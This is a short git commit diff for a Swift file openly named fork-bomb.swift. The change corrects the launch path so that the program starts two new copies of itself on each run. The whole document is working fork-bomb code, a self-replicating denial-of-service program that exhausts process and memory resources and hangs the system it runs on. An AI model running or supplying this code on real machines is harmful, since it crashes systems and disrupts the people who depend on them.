06c385f3fba5bcc68935556675bd768f3acd8a17
lomnom <57130071+lomnom@users.noreply.github.com>
2021-05-02 16:17:40 +0800

    Update fork-bomb.swift

--- fork-bomb.swift
+++ fork-bomb.swift
@@ -3,9 +3,9 @@
 import Foundation
 
 let child1 = Process()
-child1.launchPath = "./FORK.swift" /* the path to the current executable */
+child1.launchPath = "./fork-bomb.swift" /* the path to the current executable */
 child1.launch()
 
 let child2 = Process()
-child2.launchPath = "./FORK.swift" /* the path to the current executable */
+child2.launchPath = "./fork-bomb.swift" /* the path to the current executable */
 child2.launch()
